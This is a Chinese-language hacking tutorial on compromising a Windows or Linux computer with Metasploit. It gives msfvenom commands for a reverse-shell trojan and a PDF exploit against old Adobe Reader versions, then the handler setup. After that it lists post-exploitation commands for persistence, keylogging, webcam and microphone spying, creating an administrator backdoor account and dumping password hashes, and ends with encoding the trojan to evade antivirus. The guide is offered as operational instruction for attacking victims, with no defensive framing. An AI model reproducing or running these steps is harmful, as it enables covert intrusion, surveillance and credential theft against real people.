利用msf入侵电脑
# 1. 准备阶段
需要的工具

msfvenom、msfconsole

执行命令：
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本地IP> LPORT=<本地端口>  -f exe -o hacker.exe
```
参数：
```
-p payloads

-f 输出格式

-o 输入地址

-e 编码方式（msfvenom -l -encoder 可以查看能使用的编码）

-x | -k 绑定程序 （例如 –x C:\nomal.exe –k –f exe –o C:\shell.exe）
```
<img width="500px" src="https://gitee.com/naiswang/images/raw/master/20191202161139.png"/>

注： 上述代码不能拿生成pdf文件， 使用如下代码来生成pdf木马， 这个pdf木马是针对于adobe的一个漏洞，版本为Adobe Reader 8.2.4 - 9.3.4，  所以只有这些版本打开这个pdf木马才有用
<img width="500px" src="https://gitee.com/naiswang/images/raw/master/20191202174058.png"/>

即生成后门文件 hacker.exe
把它放到目标电脑上面（这里我放在WIN10 上面）

如果被攻击的主机为linux， 则需要在linux上为该文件赋予权限chmod 777 hacker.exe

执行命令：
```
msfconsole （运行msfconsole）
msf > use exploit/multi/handler （选择模块）
msf exploit(handler) > exploit -z -j （后台执行）
```
<img width="500px" src="https://gitee.com/naiswang/images/raw/master/20191202161456.png"/>
这个时候等待目标打开我们的hacker.exe，打开即上钩了
```
msf exploit(handler) > sessions（查看上钩的用户）
```
<img width="500px" src="https://gitee.com/naiswang/images/raw/master/20191202161558.png"/>
```
msf exploit(handler) > sessions -i 1（选择需要攻击的用户，这里选择第 1 个）
```

# 2. 攻击
```
run migrate -n explorer.exe  将木马线程迁移到进程explorer.exe上，这样，即使用户关闭了这个木马程序，也不会断开后门的连接。

background 将当前会话移动到背景(激活会话： 在msfconsole中输入sessions命令, 然后使用session id号来激活)

shell （执行shell， 对目标主机shell操作）

getwd (查看所在目标主机的目录)

getlwd (查看本地目录)

upload /root/ssh.apk C:\\   （将/root/ssh.apk文件传到目标主机的C盘下）

download C:\\1.exe （下载目标主机C盘下的1.exe文件到本地的lwd目录）

uictl           -->控制一些用户界面组件（获取键盘、鼠标控制权）
使用uictl -h 查看帮助（打开/关闭，键盘/鼠标）
列： uictl disable mouse  (禁用目标主机的鼠标)

keyscan_start   -->开始捕获击键（开始键盘记录）
keyscan_dump    -->转储按键缓冲（下载键盘记录）
keyscan_stop    -->停止捕获击键（停止键盘记录）
PS：键盘记录注意点，先开始，后下载，再结束，否则会出错

screenshot      -->抓取交互式桌面截图（当前操作界面截图一张）

net user wh 123 /add  (给目标主机创建一个用户名为wh,  密码为123的用户，  此时wh用户为普通用户)
net localgroup administrators wh /add (将wh用户提权到管理员)

reboot (重启目标电脑)
shudown (关闭目标电脑)

record_mic       -->X秒从默认的麦克风record_mic音频记录（音频录制）

webcam_chat      -->开始视频聊天（视频，对方会有弹窗）
webcam_list      -->单摄像头（查看摄像头列表）
webcam_snap      -->采取快照从指定的摄像头（摄像头拍摄一张照片）
webcam_stream    -->播放视频流从指定的摄像头（开启摄像头监控）

getsystem        -->获取高权限
hashdump         -->获取当前用户hash

```


# 3. 木马免杀：

这里使用msfvenom生成木马同时对payload编码来实现木马的简单免杀：

-e 选项用来指定要使用的编码器。

-i 选项用来指定对payload编码的次数。

首先看看有哪些编码器可以使用：
```
msfvenom -l encoders
```
<img width="500px" src="https://gitee.com/naiswang/images/raw/master/20191202164329.png"/>

我们挑选一个免杀效果比较好的x86/shikata_ga_nai进行编码。

```
msfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f elf -o /root/payload_encoder.elf
```

从图中我们可以看到完成了对木马的5次编码，这样木马基本上就可以躲避部分杀毒软件的查杀，其实还可以对木马程序进行多次编码，虽然可以提高木马的免杀几率，不过可能会导致木马程序不可用。当然要想免杀效果更好就需要使用Metasploit pro版本或者给木马加壳、修改木马的特征码等等，不过要想躲过全部杀毒软件的查杀则会有些难度，通常会针对某个杀毒软件进行免杀。